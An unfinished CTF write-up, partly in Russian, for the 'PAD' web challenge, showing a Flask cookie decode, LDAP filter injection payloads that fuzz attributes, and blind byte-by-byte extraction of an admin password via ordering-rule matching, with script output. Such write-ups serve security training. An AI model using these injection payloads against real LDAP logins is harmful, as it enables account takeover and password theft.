# CTF Writeup

CTF: POC CTF 2025 (https://flagyard.com/events/65fb235d-0944-42cc-b46e-f6247b2d9e31)
Chal name: PAD
Type: WEB
Solves: 51 out 500 (10% of players could solve it)


## Recon




## Foothold

## Exploitation


<form id="loginForm">
    <div class="form-group">
        <label for="username">Username</label>
        <input type="text" id="username" name="username" required autocomplete="username" placeholder="Enter your username">
    </div>
    <!-- player1 / password123 -->
    <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="Enter your password">
    </div>



flask-unsign --decode --cookie '.eJyrVkosLclIzSvJTE4sSU1RsiopKk3VUSotTi2KzwRylUozU2wLchIrU4sMdfJLbUESxTopybYFiSk5IDonPzkxRwmiIy8xNxWoBapcqRYAOD8hRw.aOuVug.gXxEpGtw600ebtSNuQx-LSC63ZU'
{'authenticated': True, 'user_id': 'uid=player1,ou=users,dc=padl,dc=local', 'username': 'player1'}

Вот теперь понятно что мы имеем дело с LDAP аутентификацией


находим валидный аттрибут

userPassword
objectClass
commonName
surname
name
cn
sn

подтверждаем

player1)(&FUZZ&=*)

userPassword валиден, значит это наш аттрибут пароля и мы можем его контролировать!


player1)(userPassword:2.5.13.18:=\70\62

След число должно быть на 1 больше чем то с которым оно сравнивается и так и далее


```bash
(venv) yok@nix:~/Sandbox/Flagyard25/PADL$ python3 passwd.py 
Found byte 1: 0x50 ('P'); current payload suffix: \50
Found byte 2: 0x34 ('4'); current payload suffix: \34
Found byte 3: 0x64 ('d'); current payload suffix: \64
Found byte 4: 0x6c ('l'); current payload suffix: \6c
Found byte 5: 0x5f ('_'); current payload suffix: \5f
Found byte 6: 0x41 ('A'); current payload suffix: \41
Found byte 7: 0x64 ('d'); current payload suffix: \64
Found byte 8: 0x6d ('m'); current payload suffix: \6d
Found byte 9: 0x31 ('1'); current payload suffix: \31
Found byte 10: 0x6e ('n'); current payload suffix: \6e
Found byte 11: 0x5f ('_'); current payload suffix: \5f
Found byte 12: 0x53 ('S'); current payload suffix: \53
Found byte 13: 0x33 ('3'); current payload suffix: \33
Found byte 14: 0x63 ('c'); current payload suffix: \63

...

Found byte 59: 0x32 ('2'); current payload suffix: \32
Found byte 60: 0x30 ('0'); current payload suffix: \30
Found byte 61: 0x32 ('2'); current payload suffix: \32
Found byte 62: 0x34 ('4'); current payload suffix: \34
Found byte 63: 0x21 ('!'); current payload suffix: \21
Found byte 64: 0x21 ('!'); current payload suffix: \21
Traceback (most recent call last):
  File "/home/yok/Sandbox/Flagyard25/PADL/passwd.py", line 61, in <module>
    password_bytes += bytes([saved_byte_value])
                      ^^^^^^^^^^^^^^^^^^^^^^^^^
ValueError: bytes must be in range(0, 256)

```
Ouch, there is an error but I got the password anyway and flagged lucky for me: `P4dl_Adm1n_S3cur3_P@ssw0rd_W1th_Sp3c14l_Ch4r5_And_Numb3r5_2024!!`. But looking back at the code we can spot the error:

tbd